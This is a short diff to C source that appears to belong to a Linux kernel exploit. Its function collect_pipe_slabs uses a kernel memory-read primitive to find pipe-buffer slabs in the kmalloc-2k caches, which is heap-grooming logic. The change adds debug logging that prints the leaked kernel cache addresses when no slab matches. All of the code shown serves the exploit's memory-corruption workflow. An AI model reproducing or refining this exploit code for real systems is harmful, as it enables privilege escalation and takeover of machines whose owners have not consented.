@@ -883,6 +883,7 @@ static int collect_pipe_slabs(int fd, uint64_t slabs[OSS_PIPE_MAX_SLABS],
   }
   uint64_t normal_2k = caches[OSS_KMALLOC_NORMAL_2K_SLOT];
   uint64_t cgroup_2k = caches[OSS_KMALLOC_CGROUP_2K_SLOT];
+  uint64_t observed_cache[OSS_PIPE_MAX_SLABS] = {0};
   size_t matching_pages = 0;
   if (!is_direct_ptr(normal_2k) || !is_direct_ptr(cgroup_2k)) {
     return 0;
@@ -901,6 +902,7 @@ static int collect_pipe_slabs(int fd, uint64_t slabs[OSS_PIPE_MAX_SLABS],
     }
     uint64_t slab_cache = oss_kernel_read64(
         fd, page + OSS_STRUCT_SLAB_CACHE_OFF);
+    observed_cache[off / OSS_PAGE_SIZE] = slab_cache;
     if (slab_cache == normal_2k || slab_cache == cgroup_2k) {
       matching_pages++;
       uint64_t slab_base = page_to_direct(page);
@@ -921,6 +923,21 @@ static int collect_pipe_slabs(int fd, uint64_t slabs[OSS_PIPE_MAX_SLABS],
           "scan_base=%016llx\n",
           matching_pages, *slab_count,
           (unsigned long long)g_pipe_page_base);
+  if (!matching_pages) {
+    fprintf(stderr,
+            "[pipe_rw] selection miss caches normal=%016llx cgroup=%016llx"
+            " observed=%016llx,%016llx,%016llx,%016llx,%016llx,%016llx,%016llx,%016llx\n",
+            (unsigned long long)normal_2k,
+            (unsigned long long)cgroup_2k,
+            (unsigned long long)observed_cache[0],
+            (unsigned long long)observed_cache[1],
+            (unsigned long long)observed_cache[2],
+            (unsigned long long)observed_cache[3],
+            (unsigned long long)observed_cache[4],
+            (unsigned long long)observed_cache[5],
+            (unsigned long long)observed_cache[6],
+            (unsigned long long)observed_cache[7]);
+  }
   return *slab_count != 0;
 }
 
